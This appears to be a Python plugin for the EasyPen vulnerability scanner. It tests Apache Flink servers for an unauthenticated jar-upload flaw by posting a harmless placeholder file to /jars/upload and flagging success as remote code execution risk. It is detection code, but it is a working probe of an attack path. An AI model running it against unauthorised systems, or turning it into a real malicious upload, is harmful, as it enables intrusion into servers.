#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    target = '{}://{}:{}/jars/upload'.format(service, ip, port)
    filename = random_str(8) + ".jar"
    files = {b"file": (filename, b"flink upload rce, your machine has been pwned!", "application/octet-stream")}

    try:
        r = await http_client(ip, port).post(target, files=files, timeout=20)
        if 'status' not in r.text:
            return
        r = r.json()
        if r['status'] == "success" and r['filename'].find(filename) >= 0:
            ret = {
                'alert_group': 'Flink Upload RCE',
                'affects': '{}://{}:{}'.format(service, ip, port),
                'details': u'Flink web未对upload页面做限制，任何人可上传一个jar包执行，上传恶意jar包可获取系统权限\n'
                           u'Uploaded filename:  {}'.format(r['filename'])
            }
            return ret
    except json.decoder.JSONDecodeError as e:
        pass
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8081, 'http', True, task_msg={})
    run_plugin_test(scan)
